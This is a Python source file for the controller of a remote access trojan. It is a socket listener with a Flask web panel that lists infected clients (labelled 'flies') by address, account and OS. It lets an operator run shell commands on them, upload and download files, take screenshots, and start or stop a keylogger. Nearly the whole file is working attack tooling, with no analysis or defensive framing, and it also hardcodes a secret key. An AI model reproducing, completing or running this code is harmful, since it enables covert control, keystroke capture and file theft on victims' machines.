import socket
from threading import Thread
import sys
import os
from time import sleep
from pathlib import Path
import socketio

from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, send, leave_room, join_room
from threading import Thread

app = Flask(__name__)
app.secret_key = "8sa0fdsuo43fdjiofs90dfasdfa0"
sio = SocketIO(app)

WS_CONNECTIONS = []

CONNECTIONS = []
CONNECTIONS_COUNT = 0
ADDRESSES = []
THREADS = []
BUFFER = 1024
PROMPT = '#: '

ACTIVE_CONNECTION = False
SOCK = False
SPACE = ' '

@app.route('/')
def index():
    return render_template('home.html')

@app.route('/connections')
def get_connections():
    global ADDRESSES

    return jsonify(ADDRESSES)

@sio.on('connect')
def connect_web():
    global WS_CONNECTIONS
    global ADDRESSES

    WS_CONNECTIONS.append(request.sid)
    emit('flies', ADDRESSES)

@sio.on('message')
def send_message(msg):
	send(msg, broadcast=True)

@sio.on('disconnect')
def on_disconnect():
    del WS_CONNECTIONS[WS_CONNECTIONS.index(request.sid)]

encode_utf = lambda text: str(text).encode('utf-8')
decode_utf = lambda text: text.decode('utf-8')

websocket = socketio.Client()

@websocket.event
def connect():
    #print('Connected to server')
    pass

@websocket.event
def connect_error():
    print('Websocket Error')

BANNER = r"""
_______________________________________________________
++===================================================++
:$ ##########_###########+           _   _           :$
:$ ######## |/| #########|          |\| |_           :$
:$ ######## |\| ######## _          |/| |_           :$
:$ ######## |/| ####### / \         |\|  _           :$
:$ ######## |\| ###### / ? \        |/| |_|          :$
:$ ######## |/| ##### /*/ \ \       |\| | |          :$
:$ ######## |\| #### /*/ $ \ \      |/|\   /         :$
:$ ######## |/| ### /*/ #|  \ \     |\| \_/          :$
:$ ######## |\| ## /*/ ##|   \ \    |/|  _           :$
:$ ######## |/| # /*/ ###|    \ \   |\| |_           :$
:$ ######## |\|  /*/ ####|     \ \  |/| |_           :$
:$ ######## |/| /*/ #####|      \ \ |\|  _           :$
:$ ######## |\|/*/ ######|       \ \|/| |_|          :$
:$ ######## \ @ / ######/ \       \ @ / | \          :$
:$ ######### \_/ ##(v 0.1-alpha)   \_/               :$
:$ ########### author: @theonlyamos                  :$
++___________________________________________________++
=======================================================
"""

def PrintBanner():
    print(BANNER)

class ExitException(Exception):
    pass

def ClearScreen(conn=False):
    os.system("clear")

def ConnectWebsocket():
    try:
        sleep(5)
        websocket.connect('http://localhost:5000',transports=['websocket'])
    except:
        ConnectWebsocket()

def CountActiveConnections():
    global CONNECTIONS
    global CONNECTIONS_COUNT 
    
def ListWSConnections(conn=False):
    global WS_CONNECTIONS
    print(len(WS_CONNECTIONS))

def ListConnections(conn=False):
    """
    Function for listing connected clients
    """
    global ACTIVE_CONNECTION
    global CONNECTIONS
    if (len(ADDRESSES)):
        print(f" #{SPACE*3} Address {SPACE*9} Account {SPACE*6} OS")
        for i in range(len(ADDRESSES)):
            address = ADDRESSES[i][0]
            port = ADDRESSES[i][1]
            account = ADDRESSES[i][2]
            op_sys = ADDRESSES[i][3] + " " + ADDRESSES[i][4]
            if ACTIVE_CONNECTION:
                active_conn_index = CONNECTIONS.index(ACTIVE_CONNECTION)
                if i == active_conn_index:
                    print(f"*{i}{SPACE*3} {address}:{port} {SPACE*3} {account} {SPACE*6} {op_sys}")
                else:
                    print(f" {i}{SPACE*3} {address}:{port} {SPACE*3} {account} {SPACE*6} {op_sys}")
            else:
                print(f" {i}{SPACE*3} {address}:{port} {SPACE*3} {account} {SPACE*6} {op_sys}")
    else:
        print('No Connections Available')

def ChangeActiveConnection(conn=False):
    """
    Function for Changing active connection (marked with *)
    """
    global CONNECTIONS
    global ACTIVE_CONNECTION
    global PROMPT

    if conn:
        ACTIVE_CONNECTION = conn
        active_conn_index = CONNECTIONS.index(ACTIVE_CONNECTION)
        PROMPT = f'[{active_conn_index}]$: '
    #else:
        #print("Set Active Connection\n--i <Connection No>\ne.g: --i 0")

def CloseActiveConnection(conn=False):
    """
    Function for closing active connection
    """
    global ACTIVE_CONNECTION
    global ADDRESSES
    global CONNECTIONS
    global PROMPT

    CURRENT_CONNECTION = conn if conn else ACTIVE_CONNECTION
    
    try:
        if CURRENT_CONNECTION:
            active_conn_index = CONNECTIONS.index(CURRENT_CONNECTION)
            del CONNECTIONS[active_conn_index]
            del ADDRESSES[active_conn_index]
            CURRENT_CONNECTION.send(encode_utf('exit'))
            PROMPT = '#: '
            
            if ACTIVE_CONNECTION:
                ACTIVE_CONNECTION = False
        else:
            print('No connection to close')
    except BrokenPipeError:
        PROMPT = '#: '

def PushFile(file_name):
    """
    Function for copying a file to the client
    """
    global ACTIVE_CONNECTION
    full_path = Path(file_name)
    try:
        if full_path.is_file():
            file_info = f"{str(full_path)} {os.path.getsize(full_path)} bytes"
            print(f"Uploading {file_info}")
            with full_path.open(mode="rb") as file:
                while True:
                    data = file.read(BUFFER)
                    ACTIVE_CONNECTION.send(data)
                    if len(data) < BUFFER:
                        break
        else:
           print("Select file to upload")
    except Exception as e:
        print(str(e))

def PullFile(file_name=False):
    """
    Function for copying a file from the client
    """
    global ACTIVE_CONNECTION
    if file_name:
        try:
            ACTIVE_CONNECTION.send(encode_utf(file_name))
            raw = ACTIVE_CONNECTION.recv(BUFFER)
            file_info = decode_utf(raw)
            file_info = file_info.split(" ")
            print(f"{file_info[0]} {file_info[1]} bytes")
            
            with open(file_name, 'ab') as file:
                while True:
                    raw = ACTIVE_CONNECTION.recv(BUFFER)
                    percentage = int((int(file_info[1])/len(raw)))
                    print(f"{percentage}%")
                    file.write(raw)
                    if len(raw) < BUFFER:
                        break
                
        except Exception as e:
            print(str(e))

def Screenshot(conn=False):
    """
    Function for taking screenshots on client
    """
    global ACTIVE_CONNECTION
    CURRENT_CONNECTION = conn if conn else ACTIVE_CONNECTION

    if CURRENT_CONNECTION:
        #try:
        #CURRENT_CONNECTION.send(encode_utf('screenshot'))
        TMP = Path('TMP')

        if not os.path.exists(TMP):
            Path.mkdir('TMP')
        file_name = Path.joinpath(TMP, 'screenshot.png')
        with open(file_name, 'wb') as file:
            while True:
                raw = ACTIVE_CONNECTION.recv(BUFFER)
                file.write(raw)
                if len(raw) < BUFFER:
                    break
        os.startfile(file_name)
        #except Exception as e:
        #    print(str(e))


def Keylogger(conn=False, action='start'):
    """
    Function for running keylogger on client
    """
    global ACTIVE_CONNECTION
    CURRENT_CONNECTION = conn if conn else ACTIVE_CONNECTION

    if CURRENT_CONNECTION:
        try:
            command = f"keylogger {action}"
            CURRENT_CONNECTION.send(encode_utf(command))
            raw = CURRENT_CONNECTION.recv(BUFFER)
            result = decode_utf(raw)
            print(result)
        except Exception as e:
            print(str(e))
    else:
        print('No client to run keylogger on')

def ClientInteractiveMode(conn=False):
    """
    Function for running commands on client interactively
    """
    global ACTIVE_CONNECTION
    CURRENT_CONNECTION = conn if conn else ACTIVE_CONNECTION

    if CURRENT_CONNECTION:
        active_conn_index = CONNECTIONS.index(CURRENT_CONNECTION)
        
        while True:
            try:
                curdir = ADDRESSES[active_conn_index][5]
                command = input(f"{curdir}> ")
                if command:
                    if command in ['back', 'exit']:
                        break
                    elif command == 'clear':
                        ClearScreen()
                        pass
                    elif command == 'close':
                        CloseActiveConnection()
                        break

                    CURRENT_CONNECTION.send(command.encode('utf-8'))

                    if command.split(" ")[0] == 'cd':
                        raw = CURRENT_CONNECTION.recv(BUFFER)
                        result = raw.decode('utf-8')
                        ADDRESSES[active_conn_index][5] = result
                    elif command.split(" ")[0] == 'pull':
                        PullFile(command.split(" ")[1])
                    elif command.split(" ")[0] == 'push':
                        PushFile(command.split(" ")[1])
                    elif command.split(" ")[0] == 'keylogger':
                        action = False
                        if len(command.split(" ")) > 1:
                            action = command.split(" ")[1]
                        Keylogger(CURRENT_CONNECTION, action)
                    elif command.split(" ")[0] == 'screenshot':
                        Screenshot()
                    else:
                        while True:
                            raw = CURRENT_CONNECTION.recv(BUFFER)
                            result = raw.decode('utf-8')
                            print(result)
                            if len(raw) < BUFFER:
                                break  
            except Exception as e:
                print(str(e))
                break
            except KeyboardInterrupt:
                break
    else:
        print('No client to interact with')

def RunCmdCommands(conn=False, command=False):
    """
    Function for running commands on client
    """
    global ACTIVE_CONNECTION
    CURRENT_CONNECTION = conn if conn else ACTIVE_CONNECTION

    try:
        if CURRENT_CONNECTION and command:
            CURRENT_CONNECTION.send(encode_utf(command))
            if command.split(" ")[0] == 'cd':
                raw = CURRENT_CONNECTION.recv(BUFFER)
                result = raw.decode('utf-8')
            elif command.split(" ")[0] == 'pull':
                PullFile(command.split(" ")[1])
            elif command.split(" ")[0] == 'push':
                PushFile(command.split(" ")[1])
            elif command.split(" ")[0] == 'keylogger':
                Keylogger()
            elif command.split(" ")[0] == 'screenshot':
                Screenshot()
            else:
                while True:
                    raw = CURRENT_CONNECTION.recv(BUFFER)
                    result = raw.decode('utf-8')
                    print(result)
                    if len(raw) < BUFFER:
                        break
        elif not CURRENT_CONNECTION:
            print('No client to run command on')
        else:
            print('No command to run')
    except:
        print('Invalid connection selected')

def ConnectionHandler(conn):
    print(conn)
    pass

def ExitProgram(conn=False):
    """
    Function for exiting the program
    """
    global SOCK
    global CONNECTIONS
    global THREADS

    print('Exiting...')
    sleep(1)
    try:
        for connection in CONNECTIONS:
            connection.close();
        if SOCK:
            SOCK.close()
        SOCK = False
        for thread in THREADS:
            print(thread.name, thread.is_alive(), thread.daemon)
            thread._stop()
        print('stopping')
        sys.exit(1)
    except AssertionError:
        sys.exit(1)

def PrintHelp():
    for item in INTERFACE_FUNCTIONS.keys():
        print(f'{item}\t{INTERFACE_FUNCTIONS[item].__name__}')

def Listener():
    """
    Function for listener thread
    """
    global SOCK
    global CONNECTIONS
    global WEBSOCKET
    global ADDRESSES

    try:
        SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #print('Listening on 0.0.0.0:1995\n')
        SOCK.bind(('0.0.0.0', 1995))
        SOCK.listen()

        while SOCK:
            conn, addr = SOCK.accept()
            print(f'[Connected] {addr[0]}::{addr[1]}')
            info = conn.recv(BUFFER)
            info = info.decode('utf-8')
            info = info.split(' ')
            CONNECTIONS.append(conn)
            ADDRESSES.append([addr[0], addr[1], info[0], info[1], info[2], info[3]])
            websocket.emit('message', {'fly': [addr[0], addr[1], info[0], info[1], info[2], info[3]]})
    except ExitException:
        for c in CONNECTIONS:
            c.close()
        sys.exit(1)
    except Exception as e:
        print(str(e))
    except KeyboardInterrupt:
        print('Exited...')
        sys.exit(0)

def Interface():
    global CONNECTIONS
    global PROMPT
    #PrintBanner()
    while True:
        try:
            command = input(PROMPT)
            func = command.split(' ')
            if func[0] in INTERFACE_FUNCTIONS.keys():
                if len(func) == 2 and func[1].isnumeric:
                    INTERFACE_FUNCTIONS[func[0]](CONNECTIONS[int(func[1])])
                if len(func) == 3 and func[1].isnumeric:
                    INTERFACE_FUNCTIONS[func[0]](CONNECTIONS[int(func[1])], func[2])
                else:
                    INTERFACE_FUNCTIONS[func[0]]()
            else:
                print('Command not found')
                pass
        except ValueError:
            pass
        except IndexError:
            print('Provide valid connection number')
            pass
        except EOFError:
            ExitProgram()
        except KeyboardInterrupt:
            print('Exited...')
            ExitProgram()

def StartWebserver():
    try:
        sio.run(app)
    except KeyboardInterrupt:
        sys.exit(1)
    except Exception as e:
        print(e);

if __name__ == "__main__":
    try:
        INTERFACE_FUNCTIONS = { '--l': ListConnections,
                            '--ws': ListWSConnections,
                            '--a': ChangeActiveConnection,
                            '--i': ClientInteractiveMode,
                            '--c': RunCmdCommands,
                            '--k': Keylogger,
                            '--s': Screenshot,
                            '--x': CloseActiveConnection,
                            'clear': ClearScreen,
                            'help': PrintHelp,
                            'exit': ExitProgram}
    
        THREADS = [ Thread(target=Listener), 
                Thread(target=ConnectWebsocket),
                Thread(target=Interface),
                Thread(target=StartWebserver)]
        THREADS[0].daemon = True
        THREADS[0].name = 'ListenerThread'
        THREADS[1].name = 'WebSocketThread'
        THREADS[2].name = 'InterfaceThread'
        THREADS[3].name = 'WebServerThread'
        for thread in THREADS:
            thread.start()
    except KeyboardInterrupt:
        sys.exit(1)

    #print('[INFO] Starting server at http://localhost:5000')
    #try:
    #    sio.run(app)
    #except KeyboardInterrupt:
    #    sys.exit(0)
    
